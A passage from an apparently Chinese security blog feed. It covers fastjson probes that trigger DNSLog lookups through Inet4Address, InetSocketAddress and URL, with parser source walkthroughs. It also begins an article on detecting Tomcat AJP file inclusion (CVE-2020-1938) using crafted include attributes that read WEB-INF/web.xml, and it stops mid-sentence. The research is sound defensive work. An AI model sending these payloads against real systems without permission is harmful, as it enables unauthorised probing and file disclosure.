class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = className.charAt(mask);</span><br><span class="line">                hash ^= (<span class="keyword">long</span>)c;</span><br><span class="line">                hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjason对于<code>Inet4Address</code>类会使用<code>MiscCodec</code>这个<code>ObjectDeserializer</code>来反序列化。跟进发现解析器会取出val字段的值赋值给strVal变量，由于我们的类是Inet4Address，所以代码会执行到1处，进行域名解析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"> ...</span><br><span class="line">        strVal = (String)objVal;</span><br><span class="line">        <span class="keyword">if</span> (strVal != <span class="keyword">null</span> &amp;&amp; strVal.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == UUID.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URI.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URL.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == Pattern.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == Locale.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == SimpleDateFormat.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 1. 将strVal作为主机名,获取其对应的ip，域名在此处被解析</span></span><br><span class="line">                    <span class="keyword">return</span> InetAddress.getByName(strVal);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnknownHostException var11) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"deserialize inet adress error"</span>, var11);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-方法二-利用java-net-InetSocketAddress"><a href="#0x03-方法二-利用java-net-InetSocketAddress" class="headerlink" title="0x03 方法二:利用java.net.InetSocketAddress"></a>0x03 方法二:利用java.net.InetSocketAddress</h2><p><code>java.net.InetSocketAddress</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p><p>通过它要走到<code>InetAddress.getByName()</code>流程相比方法一是要绕一些路的。刚开始一直没构造出来，后来在和实验室的<code>@背影</code>师傅交流时，才知道可以顺着解析器规则构造（<code>它要啥就给它啥</code>），最终payload如下，当然它是畸形的json。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"java.net.InetSocketAddress"</span>&#123;<span class="attr">"address"</span>:,<span class="attr">"val"</span>:<span class="string">"dnslog"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>那这个是怎样构造出来的呢？这就需要简单了解下fastjson的词法分析器了，这里就不展开了。这里尤为关键的是解析器<code>token</code>值对应的含义，可以在<code>com.alibaba.fastjson.parser.JSONToken</code>类中看到它们。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.JSONToken</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSONToken</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">name</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(value) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"int"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"float"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"string"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"iso8601"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"true"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"false"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"null"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"new"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"("</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">")"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#123;"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#125;"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"["</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"]"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">","</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">":"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"ident"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"fieldName"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"EOF"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Set"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"TreeSet"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"undefined"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">";"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"."</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hex"</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Unknown"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造这个payload需要分两步，第一步我们需要让代码执行到1处，这一路解析器要接收的字符在代码已经标好。按照顺序写就是<code>{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line">        String className;</span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == <span class="number">8</span>) &#123;</span><br><span class="line">                lexer.nextToken();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 12 ---&gt; &#123;</span></span><br><span class="line">                parser.accept(<span class="number">12</span>);</span><br><span class="line">                InetAddress address = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">int</span> port = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    className = lexer.stringVal();</span><br><span class="line">                    </span><br><span class="line">                    lexer.nextToken(<span class="number">17</span>);</span><br><span class="line">                    <span class="comment">// 字段名需要为address</span></span><br><span class="line">                    <span class="keyword">if</span> (className.equals(<span class="string">"address"</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 17 ---&gt; :</span></span><br><span class="line">                        parser.accept(<span class="number">17</span>);</span><br><span class="line">                        <span class="comment">// 1. 我们需要让解析器走到这里</span></span><br><span class="line">                        address = (InetAddress)parser.parseObject(InetAddress.class);</span><br><span class="line">                    &#125; </span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parser.parseObject(InetAddress.class)</code>最终依然会，调用<code>MiscCodec#deserialze()</code>方法来序列化，这里就来到我们构造payload的第二步。第二步的目标是要让解析器走到<code>InetAddress.getByName(strVal)</code>。解析器要接受的字符在代码里标好了，按照顺序写就是<code>,&quot;val&quot;:&quot;http://dnslog&quot;}</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line">        String className;</span><br><span class="line">        <span class="comment">// 序列化的是InetAddress.class类，走else流程</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object objVal;</span><br><span class="line">            <span class="keyword">if</span> (parser.resolveStatus == <span class="number">2</span>) &#123;</span><br><span class="line">                parser.resolveStatus = <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// 16 ---&gt; ,</span></span><br><span class="line">                parser.accept(<span class="number">16</span>);</span><br><span class="line">                <span class="keyword">if</span> (lexer.token() != <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 字段名 ---&gt; val</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                lexer.nextToken();</span><br><span class="line">                <span class="comment">// 17 ---&gt; :</span></span><br><span class="line">                parser.accept(<span class="number">17</span>);</span><br><span class="line">                <span class="comment">// 之后解析为对象,也就是val字段对应的值</span></span><br><span class="line">                objVal = parser.parse();</span><br><span class="line">                <span class="comment">// 13 ---&gt; &#125;</span></span><br><span class="line">                parser.accept(<span class="number">13</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            ....</span><br><span class="line">           <span class="comment">// 后续的流程和方法一一样了，进行类型判断</span></span><br><span class="line">           strVal = (String)objVal;</span><br><span class="line">           <span class="keyword">if</span> (strVal != <span class="keyword">null</span> &amp;&amp; strVal.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == UUID.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URI.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URL.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 域名解析</span></span><br><span class="line">                    <span class="keyword">return</span> InetAddress.getByName(strVal);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnknownHostException var11) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"deserialize inet adress error"</span>, var11);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两段合起来就得到了最终的payload。</p><h2 id="0x04-方法三-利用java-net-URL"><a href="#0x04-方法三-利用java-net-URL" class="headerlink" title="0x04 方法三:利用java.net.URL"></a>0x04 方法三:利用java.net.URL</h2><p><code>java.net.URL</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;:"x"&#125;</span><br></pre></td></tr></table></figure><p>来源于<code>@retanoj</code>和<code>@threedr3am</code>两位师傅的启发,其原理和ysoserial中的<code>URLDNS</code>这个gadget原理一样。</p><p><strong>简单来说就是向HashMap压入一个键值对时，HashMap需要获取key对象的hashcode。当key对象是一个URL对象时，在获取它的<code>hashcode</code>期间会调用<code>getHostAddress</code>方法获取host，这个过程域名会被解析。</strong></p><p><img src="/articles/2020/several-ways-to-detect-fastjson-through-dnslog/2.png" alt="URL对象hashcode的获取过程"></p><p>fastjson解析上述payload时，先反序列化出<code>URL(http://dnslog)</code>对象，然后将<code>{URL(http://dnslog):&quot;x&quot;}</code>解析为一个HashMap,域名被解析。</p><p><code>@retanoj</code>在<a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">Issue</a>中还构造了好几个畸形的payload，虽然原理都是一样的,但还是挺有意思的,感受到了师傅对fastjson词法分析器透彻的理解。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.alibaba.fastjson.JSONObject", &#123;"@type": "java.net.URL", "val":"http://dnslog"&#125;&#125;""&#125;</span><br><span class="line">Set[&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;]</span><br><span class="line">Set[&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;</span><br><span class="line">&#123;&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;:0</span><br></pre></td></tr></table></figure><h2 id="0x05-留一个问题"><a href="#0x05-留一个问题" class="headerlink" title="0x05 留一个问题"></a>0x05 留一个问题</h2><p>最后留个问题吧，我们都知道一般影响fastjson的gadget也会影响jackson。那么我们上面构造的payload，使用相同的原理能在jackson实现么？如果能，又该怎么构造呢？欢迎在blog留言区分享你的思考。</p><h2 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06 参考文献"></a>0x06 参考文献</h2><ul><li><a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/issues/3077</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何更加精确的检测Tomcat AJP文件包含漏洞(CVE-2020-1938)</title>
      <link href="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/"/>
      <url>/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/</url>
      
        <content type="html"><![CDATA[<p>通过上篇文章<a href="http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/">《CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析》</a>，我们知道这个漏洞出现在Tomcat默认的两个<code>Servlet</code>，一个是<code>DefaultServelt</code>，可以任意文件读取。第二个是<code>JspServlet</code>，可以用于文件读取和代码执行。所以我们漏洞利用的关键是让精心构造的数据包最终让这两个<code>Servlet</code>处理。但是在真实环境下的Web项目情况很复杂，会添加自定义的<code>Servlet</code>和<code>Filter</code>，使用各种框架和组件。它们的<code>Servlet</code>和<code>Filter</code>匹配规则会影响我们构造的数据包处理流向，导致我们无法检查成功。本文我们会针对常见的5种情况进行分析并一一解决！</p><h2 id="0x01-知识储备"><a href="#0x01-知识储备" class="headerlink" title="0x01 知识储备"></a>0x01 知识储备</h2><p>在分析前我们需要对Tomcat匹配规则优先级有一个了解，匹配的优先级如下，优先级从上到下：</p><ol><li>精确匹配（例如：<code>/admin/index.html</code>）</li><li>路径匹配 (例如：/*)</li><li>拓展名匹配 (例如：<code>*.jsp</code>,<code>*.jspx</code>)</li><li>缺省匹配 （比如:<code>/</code>）</li></ol><p>具体的匹配细节可以查看Tomcat源码<code>org.apache.catalina.mapper.Mapper#internalMapWrapper()</code></p><h2 id="0x02-情况一：原生Servlet环境下"><a href="#0x02-情况一：原生Servlet环境下" class="headerlink" title="0x02 情况一：原生Servlet环境下"></a>0x02 情况一：原生Servlet环境下</h2><p>Tomcat下存在多个默认的web项目，由于它们没有使用任何框架，所以借助它们来检查再好不过了。</p><ul><li>docs</li><li>examples</li><li>host-manager</li><li>manager</li></ul><p>当没有默认的web项目，我们只能检查<code>ROOT</code>下的项目了。在使用原生Servlet开发的web应用中，我们要考虑的是开发人员自定义<code>filter</code>和自定义<code>servlet</code>对漏洞影响。</p><p>按照开发经验，一般过滤器是不会过滤<code>.js</code>,<code>.css</code>,<code>.ico</code>等静态文件后缀的url，同时自定义的Servlet也不会去处理这些url。所以我们可以构造类似如下请求来绕过它们带来的影响。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/facvon.ico</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><h2 id="0x03-情况二：Sping-mvc环境下"><a href="#0x03-情况二：Sping-mvc环境下" class="headerlink" title="0x03 情况二：Sping mvc环境下"></a>0x03 情况二：Sping mvc环境下</h2><p>Spring MVC的经典配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath*:spring-mvc-config.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>虽然覆盖掉了<code>DefaultServlet</code>的匹配路径，但是<code>*.jsp,*.jspx</code>依然会交给<code>JspServlet</code>处理，所以我们可以构造如下请求让JspServlet来触发漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/index.jsp</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><p>这里顺便回答下上一篇文章提的问题</p><p><strong>问题：如果已经知道某个contoller使用的是jsp为视图模版来渲染数据，我们能否通过它来触发漏洞？</strong></p><p>答：其实是不可以的。因为spring mvc会将模版渲染后，交给JspServlet去处理之前，会调用<code>org.apache.catalina.core.ApplicationDispatcher#doInclude</code>方法对3个include属性进行重新赋值，也就是把我们之前设置的值覆盖掉了不再可控！</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/1.png" alt="doInclude方法覆盖3个include属性"></p><h2 id="0x04-情况三：Spring-boot环境下"><a href="#0x04-情况三：Spring-boot环境下" class="headerlink" title="0x04 情况三：Spring boot环境下"></a>0x04 情况三：Spring boot环境下</h2><p>Srping boot结合Tomcat来部署有两种方式，分别是<code>外置</code>和<code>内嵌</code>。</p><h4 id="5-1-内嵌Tomcat"><a href="#5-1-内嵌Tomcat" class="headerlink" title="5.1 内嵌Tomcat"></a>5.1 内嵌Tomcat</h4><p>我们先来说内嵌，它是默认的部署方式。顾名思义就是spring boot内部代码来调用Tomcat提供Web服务。这种方式默认AJP是不开启的。</p><p>若开启AJP，<code>DefaultServlet</code>的匹配路径也会将<code>org.springframework.web.servlet.DispatcherServlet</code>覆盖，而<code>JspServlet</code>这个是没有被注册的，因为该类在<code>jasper.jar</code>中，Spring boot默认的依赖中没有。</p><p>这里值得一提的是有一种情况是可以触发漏洞的，当Spring boot需要以JSP为视图模版时，jasper.jar需要被引入。通过调试Spring boot发现会自动注册一个将<code>*.jsp</code>和<code>*.jspx</code>给<code>Jspservlet</code>的处理的<code>mapper</code>，具体参考以下两处源码。</p><p>org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory#prepareContext<br><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/2.png" alt="添加JspServlet"></p><p>org.springframework.boot.web.servlet.server.AbstractServletWebServerFactory#shouldRegisterJspServlet<br><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/3.png" alt="判断JspServlet类是否加载进来了"></p><h4 id="5-2-外置Tomcat"><a href="#5-2-外置Tomcat" class="headerlink" title="5.2 外置Tomcat"></a>5.2 外置Tomcat</h4><p>外置就是把<code>SpringBoot</code>项目打成war，部署到tomcat的webapps目录下。这种情况下的检测和Spirng 